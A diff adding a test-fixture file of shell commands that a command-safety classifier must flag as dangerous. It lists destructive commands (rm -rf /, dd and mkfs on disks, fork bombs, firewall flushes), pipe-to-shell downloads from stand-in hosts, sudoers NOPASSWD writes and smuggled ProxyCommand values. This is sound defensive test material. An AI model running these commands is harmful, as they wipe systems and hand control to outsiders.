@@ -1,0 +1,1179 @@
+# Cases that must ALWAYS be classified as PELIGRO (100 %, non-negotiable).
+# These commands are only classified; they are never run.
+
+# R1: recursive rm on critical paths (basic form and option order)
+rm -rf /
+rm -rf /*
+rm -fr /
+rm -r /
+rm -r -f /
+rm -R -f /
+rm -Rf /
+rm --recursive --force /
+rm --recursive /
+rm / -rf
+rm / -r -f
+rm -rf -- /
+rm -rf "/"
+rm -rf '/'
+rm -rf //
+rm -rf build /
+
+# R1: quotes, escapes and absolute paths in the command name
+"rm" -rf /
+'rm' -rf ~
+r''m -rf /
+"r"m -rf /
+r\m -rf /
+\rm -rf /
+/bin/rm -rf /
+/usr/bin/rm -rf /home
+"/bin/rm" -rf /etc
+$'rm' -rf /
+# Decision (the conservative choice wins): $'\x72\x6d' is a static ANSI-C string the lexer resolves to rm; common variant or obfuscation?
+$'\x72\x6d' -rf /
+
+# R1: home directory
+rm -rf ~
+rm -rf ~/
+rm -rf ~/*
+rm -rf $HOME
+rm -rf "$HOME"
+rm -rf ${HOME}/
+rm -rf "${HOME}"
+rm -rf $HOME/
+rm -rf "$HOME/"
+rm -rf $HOME/*
+rm -rf node_modules dist ~
+rm -rf ~/.ssh
+rm -r ~/.ssh/
+rm -rf $HOME/.ssh
+rm -rf ~/.gnupg
+
+# R1: current directory and paths made only of . and ..
+rm -rf .
+rm -rf ./
+rm -rf ..
+rm -rf ../..
+rm -rf ./..
+rm -rf *
+rm -rf .*
+rm -rf * .*
+rm -rf ./*
+rm -rf ../*
+rm -r *
+
+# R1: system directories
+rm -rf /etc
+rm -rf /etc/*
+rm -rf /etc//
+rm -rf /usr
+rm -rf /usr/bin
+rm -rf /usr/lib/
+rm -rf /usr/local
+rm -rf /usr/share
+rm -rf /var
+rm -rf /var/lib
+rm -rf /var/lib/*
+rm -rf /boot
+rm -rf /dev
+rm -rf /home
+rm -rf /home/*
+rm -rf /lib
+rm -rf /lib32
+rm -rf /lib64
+rm -rf /opt
+rm -rf /root
+rm -rf /sbin
+rm -rf /srv
+rm -rf /sys
+rm -rf /proc
+rm -rf /run
+rm -rf /mnt
+rm -rf /media
+rm -rf /bin
+
+# R1: wrappers
+sudo rm -rf /
+sudo -u root rm -rf /
+sudo -u root -- rm -rf /
+sudo -E rm -rf /
+doas rm -rf /
+doas -u root rm -rf /etc
+pkexec rm -rf /
+run0 rm -rf /
+env rm -rf /
+env FOO=1 rm -rf /
+env -i rm -rf ~
+sudo env rm -rf /
+nice -n 10 rm -rf /
+nice rm -rf /home
+ionice -c 3 rm -rf /var
+timeout 5 rm -rf /
+timeout -s KILL 10 rm -rf /
+sudo nice -n 5 timeout 60 rm -rf /
+nohup rm -rf / &
+setsid rm -rf ~
+stdbuf -o0 rm -rf /
+time rm -rf /
+command rm -rf /
+exec rm -rf /
+flock /tmp/cerrojo rm -rf /
+watch -n 1 rm -rf /
+FOO=bar rm -rf /
+LANG=C rm -rf /
+echo x | xargs rm -rf /
+xargs -n 1 rm -rf ~
+find / -exec rm -rf {} +
+find / -name x -exec rm -rf {} +
+find ~ -exec rm -rf {} \;
+find / -maxdepth 1 -execdir rm -rf {} +
+find /etc -ok rm -rf {} \;
+# {} is replaced by the starting point ".", and rm -rf . is R1
+find . -name node_modules -exec rm -rf {} +
+bash -c 'rm -rf /'
+bash -c "rm -rf ~"
+sh -c "rm -rf /"
+dash -c 'rm -rf /'
+zsh -c 'rm -rf $HOME'
+ksh -c 'rm -rf /etc'
+sudo bash -c 'rm -rf /'
+sudo sh -c 'cd / && rm -rf *'
+su -c 'rm -rf /'
+su root -c 'rm -rf /'
+su - -c "rm -rf /"
+runuser -l root -c 'rm -rf /'
+ssh host 'rm -rf /'
+ssh -p 2222 user@servidor "rm -rf ~"
+ssh -i clave.pem root@1.2.3.4 'rm -rf /var/lib'
+
+# R1: combinations, groupings and substitutions
+ls; rm -rf /
+cd /tmp && rm -rf /
+false || rm -rf ~
+echo hola | rm -rf /
+rm -rf / &
+sleep 1 & rm -rf /
+make clean; rm -rf ~
+true && sudo rm -rf / || echo fallo
+rm -rf / 2>/dev/null
+rm -rf / >/dev/null 2>&1
+rm -rf / |& tee borrado.log
+(rm -rf /)
+{ rm -rf /; }
+if true; then rm -rf /; fi
+for i in 1; do rm -rf ~; done
+while true; do rm -rf /; done
+echo $(rm -rf /)
+echo `rm -rf ~`
+X=$(rm -rf /)
+ls "$(rm -rf /)"
+echo "$(sudo rm -rf /)"
+cat <(rm -rf /)
+`rm -rf /`
+
+# R1/R14b: static text passed to a shell interpreter
+echo 'rm -rf /' | sh
+echo "rm -rf ~" | bash
+printf 'rm -rf /' | sh
+echo 'rm -rf /' | sudo bash
+
+# R2: recursive rm with an unknown variable followed by /
+rm -rf $DIR/
+rm -rf "$DIR/"
+rm -rf $DIR/*
+rm -rf "${X}/"*
+rm -rf ${BUILD_DIR}/
+rm -rf "$PREFIX"/usr
+rm -rf $STEAMROOT/*
+rm -r ${TMPDIR}/build
+rm -rf "${dir}/"*
+rm --recursive "$OUT"/
+rm -rf -- "$1/"
+sudo rm -rf "$INSTALL_DIR/"
+bash -c 'rm -rf $D/'
+
+# R3: rm --no-preserve-root
+rm -rf --no-preserve-root /
+rm --no-preserve-root -rf /
+rm -rf / --no-preserve-root
+rm --no-preserve-root -r cosa
+rm -rf --no-preserve-root /tmp/x
+sudo rm --no-preserve-root -rf /
+
+# R5: dd with of= on a device
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/zero of=/dev/sda bs=1M
+dd if=ubuntu.iso of=/dev/sdb bs=4M status=progress
+dd of=/dev/sda if=/dev/zero
+dd if=/dev/urandom of=/dev/nvme0n1
+dd if=/dev/zero of=/dev/hda
+dd if=/dev/zero of=/dev/vda
+dd if=/dev/zero of=/dev/xvda
+dd if=/dev/zero of=/dev/mmcblk0
+dd if=/dev/zero of=/dev/dm-0
+dd if=/dev/zero of=/dev/md0
+dd if=/dev/zero of=/dev/loop0
+dd if=/dev/zero of=/dev/mapper/vg0-root
+dd if=/dev/zero of=/dev/disk/by-id/ata-DISCO
+dd if=/dev/zero of=/dev/mem
+dd if=/dev/zero of="/dev/sda"
+sudo dd if=/dev/zero of=/dev/sda1
+sudo -u root dd if=x.img of=/dev/sdc
+/usr/bin/dd if=/dev/zero of=/dev/vda
+"dd" if=/dev/zero of=/dev/sdb
+bash -c 'dd if=/dev/zero of=/dev/sda'
+dd if=/dev/zero of=/dev/sda &
+
+# R6: direct write to a device
+echo hola > /dev/sda
+echo x >> /dev/sda
+ls &> /dev/sda
+cat imagen.iso > /dev/sdb
+cat /dev/zero > /dev/nvme0n1
+cat /dev/urandom > /dev/sda1
+head -c 1M /dev/zero > /dev/vda
+echo 1 > /dev/mem
+pv imagen.img > /dev/sdb
+echo x | tee /dev/sda
+cat x.img | sudo tee /dev/mmcblk0 > /dev/null
+cp ubuntu.iso /dev/sdb
+mv disco.img /dev/sdb
+install -m 644 x /dev/sda
+cat > /dev/sda
+
+# R7: overwrite critical files
+echo '' > /etc/passwd
+echo x > /etc/shadow
+> /etc/hosts
+echo nameserver 1.1.1.1 > /etc/resolv.conf
+cat fstab.nuevo > /etc/fstab
+echo x > /etc/gshadow
+echo x >| /etc/passwd
+echo x > /boot/grub/grub.cfg
+echo x > /etc/pam.d/common-auth
+echo 'alias ls=rm' > ~/.bashrc
+echo x > $HOME/.bashrc
+echo x > ~/.profile
+echo x > ~/.bash_profile
+cat id.pub > ~/.ssh/authorized_keys
+cat > /etc/hosts
+echo x | sudo tee /etc/sudoers
+echo 'bob ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/bob
+sudo tee /etc/group < group.nuevo
+cp passwd.bak /etc/passwd
+sudo cp hosts /etc/hosts
+mv shadow.nuevo /etc/shadow
+install -m 440 sudoers /etc/sudoers
+cp /tmp/x /boot/vmlinuz
+ln -sf /dev/null /etc/resolv.conf
+ln -sf x ~/.bashrc
+
+# R8: data destruction
+mkfs.ext4 /dev/sda1
+mkfs -t ext4 /dev/sdb1
+mkfs.vfat /dev/sdc1
+mkfs.xfs -f /dev/nvme0n1p2
+mkfs.ext4 disco.img
+mke2fs /dev/sdb1
+mkswap /dev/sda2
+wipefs -a /dev/sda
+sudo wipefs --all /dev/sdb
+blkdiscard /dev/nvme0n1
+shred -u secreto.txt
+shred -n 3 -z /dev/sda
+cryptsetup luksFormat /dev/sdb1
+cryptsetup erase /dev/sdb1
+cryptsetup luksKillSlot /dev/sdb1 0
+pvremove /dev/sdb1
+vgremove vg0
+lvremove /dev/vg0/root
+sudo mkfs.ext4 -F /dev/sdb
+/sbin/mkfs.ext4 /dev/sdb1
+"mkfs.btrfs" /dev/sdd
+bash -c 'mkfs.ext4 /dev/sdb1'
+lsblk && mkfs.ext4 /dev/sdb1
+
+# R9: partition table (not listing)
+fdisk /dev/sda
+sudo fdisk /dev/nvme0n1
+sfdisk /dev/sda < esquema.txt
+echo ',,83' | sfdisk /dev/sdb
+gdisk /dev/sda
+sgdisk --zap-all /dev/sda
+sgdisk -Z /dev/sdb
+parted /dev/sda mklabel gpt
+parted -s /dev/sdb rm 1
+parted /dev/sda
+
+# R10: permissions or owners of the whole system or the home directory
+chmod -R 777 /
+chmod -R 777 ~
+chmod -R 000 /etc
+chmod -R 755 /var
+chmod -R a-x /bin
+chmod -R 600 ~/.ssh
+chmod -R 777 /home/*
+chmod --recursive 777 /usr/local
+chmod -R 777 /etc/passwd
+chown -R nobody:nogroup /
+chown -R bob /home
+chown -R root:root ~
+chgrp -R users /usr
+sudo chmod -R 777 /
+chmod 777 /
+# Decision (the conservative choice wins): R10 "or with any operand in F" does not say whether it requires -R; the conservative option is chosen
+chmod 666 /etc/shadow
+# Decision (the conservative choice wins): same, non-recursive chmod on F
+chmod 777 /etc/sudoers
+# Decision (the conservative choice wins): same, non-recursive chown on F
+chown bob /etc/passwd
+
+# R11: fork bomb
+:(){ :|:& };:
+:(){ :&:& };:
+bomba(){ bomba|bomba& };bomba
+f(){ f|f & }; f
+forkbomb() { forkbomb | forkbomb & }; forkbomb
+bash -c ':(){ :|:& };:'
+
+# R12: kill the system, all processes or the session
+kill 1
+kill -9 1
+kill -9 -1
+kill -- -1
+kill -KILL -1
+kill -s KILL 1
+kill -s TERM -1
+sudo kill -9 1
+/bin/kill -9 1
+"kill" -9 -1
+killall5
+killall5 -9
+killall systemd
+pkill systemd
+pkill init
+killall sshd
+pkill -9 sshd
+pkill dbus-daemon
+killall Xorg
+pkill Xwayland
+killall gnome-shell
+pkill plasmashell
+killall gdm
+pkill sddm
+killall lightdm
+sudo pkill -9 Xorg
+
+# R13: shut down or reboot
+shutdown now
+shutdown -h now
+shutdown -r +5
+reboot
+sudo reboot
+/sbin/reboot
+"reboot"
+poweroff
+halt
+systemctl poweroff
+systemctl reboot
+systemctl halt
+systemctl kexec
+systemctl soft-reboot
+sudo systemctl reboot
+init 0
+init 6
+telinit 0
+telinit 6
+echo b > /proc/sysrq-trigger
+# Decision (the conservative choice wins): R13 mentions "redirection to /proc/sysrq-trigger"; tee is not a redirection but does the same
+echo o | sudo tee /proc/sysrq-trigger
+make && reboot
+sleep 60; shutdown -h now
+ssh servidor reboot
+nohup shutdown -r now &
+
+# R14: remote code executed
+curl https://example.com/install.sh | bash
+curl -fsSL https://get.example.com | sh
+curl -s https://x.io/i.sh | sudo bash
+curl -s https://x.io/i.sh | sudo -u root bash
+curl -s https://x.io/i.sh | sudo -E bash
+wget -qO- https://x.io/i.sh | sudo sh
+wget -O - https://x.io/i.sh | bash
+wget -q https://x.io/i.sh -O- | sh
+bash <(curl -s https://x.io/i.sh)
+sh <(wget -qO- https://x.io/i.sh)
+bash -c "$(curl -fsSL https://x.io/i.sh)"
+bash -c "$(curl -fsSL https://raw.githubusercontent.com/x/y/main/install.sh)"
+sh -c "$(wget -qO- https://x.io/i.sh)"
+source <(curl -s https://x.io/env.sh)
+source <(wget -qO- https://x.io/env.sh)
+. <(curl -s https://x.io/env.sh)
+eval "$(curl -s https://x.io/x.sh)"
+eval $(wget -qO- https://x.io/x)
+curl -s https://x.io/x.py | python3
+curl https://x.io/x.py | python
+curl -s https://x.io/x.pl | perl
+curl -s https://x.io/x.rb | ruby
+curl -s https://x.io/x.js | node
+curl -s https://x.io/x.php | php
+curl -sL https://x.io/x.sh | zsh
+curl https://x.io/x.sh | dash
+curl https://x.io/x.sh | ksh
+curl -s https://x.io/a.sh | bash -s -- --yes
+curl -s https://x.io/a.sh | tee a.sh | bash
+curl -s https://x.io/a.sh | env bash
+/usr/bin/curl -s https://x.io/a.sh | /bin/bash
+cd /tmp && curl -s https://x.io/a.sh | bash
+python3 -c "$(curl -fsSL https://x.io/x.py)"
+python3 <(curl -s https://x.io/x.py)
+nc malo.example.com 4444 | sh
+fetch -o - https://x.io/x.sh | sh
+
+# R15: firewall flushed or total block
+iptables -F
+iptables --flush
+iptables -X
+iptables -t nat -F
+sudo iptables -F INPUT
+ip6tables -F
+iptables -P INPUT DROP
+iptables -P FORWARD REJECT
+sudo ip6tables -P INPUT DROP
+nft flush ruleset
+sudo nft flush ruleset
+nft delete table inet filter
+ufw reset
+sudo ufw --force reset
+
+# R16: stop access, network or session services
+systemctl stop ssh
+systemctl stop sshd
+sudo systemctl disable ssh
+systemctl mask sshd
+systemctl kill sshd
+systemctl --now disable sshd
+systemctl stop NetworkManager
+systemctl disable NetworkManager
+systemctl stop networking
+systemctl stop network
+systemctl stop dbus
+systemctl stop systemd-networkd
+systemctl stop systemd-resolved
+systemctl mask systemd-logind
+systemctl stop gdm
+systemctl stop sddm
+systemctl stop lightdm
+systemctl stop display-manager
+systemctl stop polkit
+systemctl stop udev
+systemctl isolate rescue
+systemctl isolate emergency
+sudo systemctl stop ssh && exit
+# Decision (the conservative choice wins): the catalogue does not say whether the .service/.target suffix is normalised
+systemctl stop ssh.service
+# Decision (the conservative choice wins): same with .target
+systemctl isolate rescue.target
+
+# R17: destructive git
+git push --force
+git push -f
+git push origin main --force
+git push --force origin main
+git push origin +main
+git push -f origin HEAD:main
+git reset --hard
+git reset --hard HEAD~3
+git reset --hard origin/main
+git clean -fd
+git clean -fdx
+git clean -f -d
+git clean -fx
+git clean -xdf
+git checkout -- .
+git restore .
+git filter-branch --tree-filter 'rm -f secretos.txt' HEAD
+git branch -D feature
+git branch -D main dev
+/usr/bin/git push --force
+"git" reset --hard
+git -C ~/proyecto reset --hard
+cd repo && git reset --hard
+git stash && git reset --hard HEAD~1
+
+# R18: docker/podman with mass deletion or volume removal
+docker system prune -a
+docker system prune --all
+docker system prune --volumes
+docker system prune -a -f --volumes
+sudo docker system prune -af
+podman system prune -a
+docker volume prune
+docker volume prune -f
+podman volume prune
+docker volume rm pgdata
+docker volume rm $(docker volume ls -q)
+docker rm -f $(docker ps -aq)
+docker rm -f `docker ps -aq`
+podman rm -f $(podman ps -aq)
+
+# R19: crontab -r
+crontab -r
+sudo crontab -r
+crontab -r -u bob
+crontab -u root -r
+
+# R20: users and accounts without protection
+userdel bob
+userdel -r bob
+sudo deluser bob
+deluser --remove-home bob
+groupdel desarrolladores
+passwd -d bob
+passwd -d root
+passwd root
+passwd -l root
+sudo passwd -l root
+
+# R21: mv of system directories or critical files, or to /dev/null
+mv / /tmp/x
+mv /etc /etc.bak
+mv /usr /usr2
+sudo mv /bin /bin.old
+mv ~ /tmp/casa
+mv ~/.ssh ~/.ssh.viejo
+mv /home/* /mnt/backup/
+mv /etc/passwd /tmp/
+mv /etc/sudoers /root/
+mv ~/.bashrc /tmp/
+mv /boot/vmlinuz /tmp/
+mv importante.txt /dev/null
+mv * /dev/null
+
+# R22: truncate on F or D
+truncate -s 0 /etc/passwd
+truncate --size=0 /etc/shadow
+truncate -s 0 ~/.bashrc
+truncate -s 0 /dev/sda
+
+# R23: mass find -delete
+find / -delete
+find / -name '*.log' -delete
+find / -path '*/cache/*' -delete
+find ~ -name '*.bak' -delete
+find /etc -type f -delete
+find /home -mtime +30 -delete
+sudo find /var -name '*.tmp' -delete
+find . -delete
+find build -delete
+find /tmp -delete
+find ~/Documentos -delete
+find . -maxdepth 1 -delete
+# -empty is not among the filters R23 accepts (-name/-path/-type/-mtime/-size)
+find ./tmp -empty -delete
+
+# R24: rsync --delete
+rsync -a --delete src/ dst/
+rsync --delete -r a/ b/
+rsync -av --delete-after ./ copia/
+rsync -a --delete-excluded src/ host:/srv/
+rsync -avz --delete-before src/ user@host:/datos/
+sudo rsync -aHAX --delete / /mnt/backup/
+
+# R25: remove critical packages
+apt remove systemd
+apt remove libc6
+sudo apt-get purge sudo
+apt-get remove coreutils
+apt purge openssh-server
+sudo apt remove network-manager
+sudo apt remove -y apt
+apt autoremove bash
+apt remove linux-image-generic
+apt-get remove linux-generic
+apt remove linux-image-5.15.0-50-generic
+apt remove grub-pc
+dnf remove glibc
+yum erase systemd
+dnf erase kernel-core
+pacman -R systemd
+pacman -Rns sudo
+zypper rm bash
+zypper remove sudo
+apk del sudo
+dpkg -r dpkg
+dpkg -P libc6
+rpm -e rpm
+rpm -e glibc
+
+# R25b: ignore dependencies
+pacman -Rdd glibc
+pacman -Rdd paquete
+rpm -e --nodeps paquete
+dpkg --force-all -r paquete
+dpkg --force-depends -i x.deb
+sudo dpkg --force-remove-essential -r bash
+
+# R27: mass kubectl delete
+kubectl delete pods --all
+kubectl delete pod --all -n prod
+kubectl -n prod delete pods --all
+kubectl delete all --all
+kubectl delete pvc --all -A
+kubectl delete deployments -A
+kubectl delete namespace prod
+kubectl delete ns staging
+
+# Combinations of other rules
+echo hola && mkfs.ext4 /dev/sdb1
+ls | grep x; dd if=/dev/zero of=/dev/sda
+git status || git reset --hard
+echo "$(dd if=/dev/zero of=/dev/sda)"
+docker ps; docker system prune -a
+(iptables -F)
+{ crontab -r; }
+sudo -u root bash -c 'chmod -R 777 /'
+
+# Whatever can be extracted from an unparsable command is still classified
+# Decision: what is extracted before the error is classified; rm -rf / is peligro
+rm -rf / 'ups
+# Decision: eval with static arguments is classified as code
+eval 'rm -rf /'
+
+# Rule extensions
+# R16 extended: service … stop of access services
+service ssh stop
+sudo service sshd stop
+service NetworkManager stop
+sudo service networking stop
+# R25 extended: Arch kernel
+sudo pacman -R linux
+pacman -Rs linux-lts
+sudo pacman -Rns linux-zen
+# R20 extended: passwd without a user under sudo/doas/su changes root's password
+sudo passwd
+doas passwd -d
+su -c 'passwd'
+# R12: PID -1 or 1 as an operand, with the signal first
+kill -9 -1
+kill -- -1
+kill -TERM 1
+sudo kill -s KILL -1
+
+# Adversarial review
+rm -rf ~root
+sudo rm -rf ~root/
+rm -rf ~bob
+chmod -R 777 ~bob
+
+# Adversarial review 2: abbreviated long options
+rm --rec --force /
+rm --recur -f ~
+git reset --har
+git push --forc
+tar --checkpoint-action=exec='rm -rf /' -cf a.tar d
+
+# Adversarial review 2: options whose value is code
+ssh -o ProxyCommand='rm -rf /' host
+scp -o 'ProxyCommand=rm -rf ~' a host:
+rsync -e 'rm -rf /' a host:b
+trap 'rm -rf /' EXIT
+git rebase -x 'rm -rf /' main
+git rebase --exec='rm -rf ~' main
+git bisect run rm -rf /
+git submodule foreach 'rm -rf /'
+git difftool -x 'rm -rf /'
+tar -cf a.tar -I 'rm -rf /' d
+man -P 'rm -rf /' ls
+env --split-string='rm -rf /'
+env --split-str='rm -rf /'
+flock /tmp/l --command 'rm -rf /'
+script -c 'rm -rf /' /dev/null
+ssh host -- rm -rf /
+
+# Adversarial review 2: paths ($HOME, $PWD, expansions, globs, quoted ~, braces)
+rm -rf ${HOME:?}
+rm -rf ${HOME%/}/
+rm -rf $PWD
+rm -rf "$PWD"/*
+rm -rf ~+
+rm -rf $(pwd)/
+rm -rf `pwd`/
+rm -rf ${arr[0]}/
+rm -rf /**
+rm -rf /[a-z]*
+rm -rf /?*
+rm -rf ~/.*
+rm -rf $'/\0tmp'
+rm -rf /{etc,usr}
+rm -rf {a,/}
+rm -rf ~{,}
+
+# Adversarial review 2: extended C, F and D sets
+rm -rf /usr/sbin
+rm -rf /home/bob
+echo x > /etc/ld.so.preload
+cp x /etc/ssh/sshd_config
+echo x > ~/.zshrc
+echo x > /root/.bashrc
+echo x > /dev/root
+cat x > /dev/nbd0
+cp x /dev/zram0
+dd if=x of=/dev/vg0/root
+
+# Adversarial review 2: write targets
+cp passwd /etc
+cp passwd /etc/
+cp -t /etc passwd
+cp --target-directory=/etc shadow
+mv .bashrc ~
+install x /etc/sudoers.d
+sort -o /etc/passwd x
+find . -fprint /etc/passwd
+tar -cf /dev/sda d
+curl -o /etc/passwd http://a
+curl --stderr /etc/shadow http://a
+wget -O /etc/hosts http://a
+ddrescue /dev/sda /dev/sdb
+dcfldd if=x of=/dev/sda
+rsync -a x /etc/passwd
+
+# Adversarial review 2: deleting a critical file (R7c)
+rm /etc/passwd
+unlink /etc/shadow
+
+# Adversarial review 2: new wrappers
+busybox rm -rf /
+busybox sh -c 'rm -rf /'
+taskset -c 0 rm -rf /
+taskset 0x1 rm -rf /
+chrt -f 10 rm -rf /
+strace -f -o /dev/null rm -rf /
+unshare -r rm -rf /
+systemd-run --user rm -rf ~
+echo 'rm -rf /' | at now
+parallel rm -rf ::: /
+parallel 'rm -rf {}' ::: /
+printf '/\n' | parallel rm -rf
+
+# Adversarial review 2: input streams as code
+xargs rm -rf <<< /
+find / -print0 | xargs -0 rm -rf
+find ~ | xargs rm -rf
+fd x / -x rm -rf
+fd x / -x rm -rf {}
+cat - <<< 'rm -rf /' | sh
+bash /dev/stdin <<< 'rm -rf /'
+bash -s <<< 'rm -rf /'
+bash - <<< 'rm -rf /'
+source /dev/stdin <<< 'rm -rf /'
+. /dev/stdin <<< 'rm -rf ~'
+echo 'rm -rf /' | sudo -s
+echo 'rm -rf /' | sudo -i
+echo 'rm -rf /' | sudo su
+echo 'rm -rf /' | su
+echo 'rm -rf /' | su -
+echo 'rm -rf /' | ssh host
+fish -c 'rm -rf /'
+tcsh -c 'rm -rf /'
+csh -c 'rm -rf /'
+yash -c 'rm -rf /'
+http https://x | sh
+xh https://x | bash
+socat - TCP:x:80 | sh
+openssl s_client -connect x:443 | sh
+curl https://x | xargs sh -c
+
+# Adversarial review 2: catalogue extensions
+nvme format /dev/nvme0n1
+nvme sanitize /dev/nvme0
+hdparm --security-erase pass /dev/sda
+hdparm --security-erase-enhanced pass /dev/sda
+mdadm --zero-superblock /dev/sdb
+zpool destroy tank
+zfs destroy tank/data
+btrfs subvolume delete /mnt/x
+btrfs sub del /mnt/x
+badblocks -wsv /dev/sdb
+cryptsetup luksRemoveKey /dev/sdb
+pkill -u bob
+killall -u bob
+pkill -f .
+pkill -f '.*'
+killall -r '.*'
+loginctl kill-user bob
+loginctl terminate-session 3
+loginctl poweroff
+loginctl reboot
+ip link set eth0 down
+ip l s eth0 down
+ip route del default
+ip route flush
+ip r flush default
+ip addr flush dev eth0
+nmcli networking off
+ifdown eth0
+systemctl stop gdm3
+systemctl stop network-manager
+crontab /dev/null
+usermod -L root
+usermod --lock root
+chage -E 0 root
+gpasswd -d bob sudo
+gpasswd -d bob wheel
+git checkout -f
+git checkout --force main
+git switch -f main
+git switch --discard-changes main
+git checkout :/
+git restore :/
+git rm -r :/
+git rm -r .
+git push --mirror
+git push --delete origin x
+git push -d origin x
+git push origin :x
+git push --prune origin
+git reflog expire --expire=now --all
+git gc --prune=now
+git prune --expire=now
+git prune --expire now
+git stash clear
+git filter-repo --path x
+docker compose down -v
+docker compose down --volumes
+docker-compose down -v
+podman system reset
+
+# Adversarial review 2: mkfs, shred and find -delete
+mkfs.ext4 /dev/sdb1
+shred -u fichero
+find /tmp -maxdepth 1 -delete
+
+# Adversarial review 2: firewall (-L together with -F still flushes it)
+iptables -L -F
+
+# Adversarial review 2: input streams as code
+echo 'rm -rf /' | xargs -I{} sh -c {}
+
+# ---- Blind adversarial review (against the risk catalogue) ----
+# reason: recursive deletion of / after sudo with options (-u, -H)
+sudo -u root -H rm -rf /
+# reason: deletion of /etc with sudo -E, -- and long options
+sudo -E -- rm --recursive --force /etc
+# reason: deletion of /usr with env -i and a PATH assignment
+env -i PATH=/usr/bin rm -rf /usr
+# reason: deletion of /var with env -u, -- and the absolute path /bin/rm
+env -u HOME -- /bin/rm -fr /var
+# reason: deletion of the home directory (~) under nice -n
+nice -n 19 rm -Rf ~
+# reason: deletion of $HOME under nohup in the background
+nohup rm -r -f $HOME &
+# reason: deletion of ${HOME} under timeout with a duration
+timeout 10s rm -rf ${HOME}
+# reason: deletion of the whole current directory (*) under time
+time rm -rf *
+# reason: deletion of the current directory (.) under stdbuf
+stdbuf -oL rm -rf .
+# reason: deletion of the parent directory (..) under setsid
+setsid rm -rf ..
+# reason: watch runs its argument with sh -c: deletion of /home
+watch -n 5 'rm -rf /home'
+# reason: deletion of /usr/lib under ionice
+ionice -c3 rm -rf /usr/lib
+# reason: partial quotes ("r"m) deleting /boot
+"r"m -rf /boot
+# reason: escapes on each letter (\r\m) deleting /etc
+\r\m -rf /etc
+# reason: command name in ANSI-C quoting ($'\x72m') deleting /
+$'\x72m' -rf /
+# reason: path /usr/bin/rm and target // (same as /)
+/usr/bin/rm -rf //
+# reason: command rm and target /./ (same as /)
+command rm -rf /./
+# reason: exec rm on /usr
+exec rm -rf /usr
+# reason: target /usr/../ that normalises to /
+rm -rf /usr/../
+# reason: abbreviated long options (--rec --forc) on ~/.gnupg
+rm --rec --forc ~/.gnupg
+# reason: variable that, when empty, leaves "/" as the target
+rm -rf "$DIR"/
+# reason: braced variable followed by /* (empty = /*)
+rm -rf "${PREFIX}/"*
+# reason: unquoted variable followed by /* (empty = /*)
+rm -rf $BUILD/*
+# reason: disabling the protection of / with separate options
+rm --no-preserve-root -r -f /
+# reason: find -delete on the home directory
+find ~ -mindepth 1 -delete
+# reason: find -exec rm -rf on /etc
+find /etc -exec rm -rf {} +
+# reason: find -execdir with rm -rf of $HOME as a fixed argument
+find . -maxdepth 0 -execdir rm -rf "$HOME" \;
+# reason: find -ok with rm -rf / as a fixed argument
+find . -maxdepth 0 -ok rm -rf / \;
+# reason: xargs fed through a pipe with /
+echo / | xargs rm -rf
+# reason: xargs with sudo deleting /etc and /usr
+printf '%s\n' /etc /usr | xargs -r sudo rm -rf
+# reason: bash -c with fixed text that deletes ~
+bash -c 'rm -rf ~'
+# reason: bash -lc: cd / and delete the whole current directory
+bash -lc 'cd / && rm -rf *'
+# reason: su -c deleting /var/lib
+su -c 'rm -rf /var/lib'
+# reason: ssh to another machine deleting the remote home directory
+ssh host 'rm -rf ~'
+# reason: here-string to bash deleting ~
+bash <<< 'rm -rf ~'
+# reason: subshell with a prior cd and deletion of /
+( cd /tmp && rm -rf / )
+# reason: { } group with something harmless first and deletion of ~
+{ true; rm -rf ~; }
+# reason: chained ls && deletion of ..
+ls && rm -rf ..
+# reason: deletion inside a command substitution $(…)
+echo $(rm -rf ~)
+# reason: dd with sudo, of= before if=, on /dev/nvme0n1
+sudo dd of=/dev/nvme0n1 if=image.iso status=progress
+# reason: cat redirected to a block device
+cat image.img > /dev/sdb
+# reason: tee to an NVMe device
+echo hola | tee /dev/nvme0n1
+# reason: cp onto a block device
+cp /dev/zero /dev/sdc
+# reason: redirection to an SD card (mmcblk)
+head -c 1G /dev/urandom > /dev/mmcblk0
+# reason: dd on a device referenced by uuid
+dd if=/dev/zero of=/dev/disk/by-uuid/abcd-1234
+# reason: eval with fixed text that overwrites a disk
+eval "dd if=/dev/zero of=/dev/sda"
+# reason: create a filesystem with mkfs.xfs -f
+mkfs.xfs -f /dev/vdb
+# reason: create a filesystem with mke2fs
+mke2fs /dev/sda2
+# reason: here-string to bash with mkfs
+bash <<< "mkfs.ext4 /dev/sda1"
+# reason: wipe signatures with long options and sudo
+sudo wipefs --all --force /dev/nvme0n1
+# reason: destroy a disk with shred
+shred -vzn 3 /dev/sda
+# reason: new partition table with parted mklabel
+parted -s /dev/sda mklabel gpt
+# reason: delete partitions with sfdisk --delete
+sfdisk --delete /dev/sda
+# reason: erase an encrypted volume with cryptsetup luksErase
+cryptsetup luksErase /dev/sda2
+# reason: remove an LVM volume with a forced lvremove
+lvremove -f vg0/root
+# reason: remove an LVM volume group
+vgremove -ff vg0
+# reason: truncate /etc/passwd with a redirection and no command
+> /etc/passwd
+# reason: overwrite /etc/shadow with a redirection
+cat /dev/null > /etc/shadow
+# reason: truncate sudoers with truncate
+truncate -s 0 /etc/sudoers
+# reason: write to /etc/sudoers.d with sudo tee and a here-string
+sudo tee /etc/sudoers.d/nopass <<< 'ALL ALL=(ALL) NOPASSWD: ALL'
+# reason: move /etc/fstab
+mv /etc/fstab /tmp/
+# reason: delete /etc/hosts
+rm -f /etc/hosts
+# reason: change the permissions of /etc/shadow
+chmod 777 /etc/shadow
+# reason: overwrite ~/.ssh/authorized_keys
+echo "ssh-rsa AAAA x" > ~/.ssh/authorized_keys
+# reason: overwrite $HOME/.profile with cp
+cp /dev/null $HOME/.profile
+# reason: empty /etc/group with sed -i
+sed -i d /etc/group
+# reason: overwrite a PAM file with install
+install -m 644 x /etc/pam.d/common-auth
+# reason: empty PAM with tee under sudo and output to /dev/null
+printf '' | sudo tee /etc/pam.d/sudo >/dev/null
+# reason: truncate ${HOME}/.zshrc with :
+: > ${HOME}/.zshrc
+# reason: chown -R on /usr
+chown -R nobody: /usr
+# reason: chgrp --recursive on /etc with sudo
+sudo chgrp --recursive users /etc
+# reason: chmod with the abbreviation --rec on the home directory
+chmod --rec 700 ~
+# reason: chown -hR on /var
+chown -hR www-data /var
+# reason: move the system directory /usr
+mv /usr /usr.bak
+# reason: move something to /dev/null
+mv ~/proyecto /dev/null
+# reason: move /etc/passwd with brace expansion
+mv -f /etc/passwd{,.old}
+# reason: reboot with something false first (||)
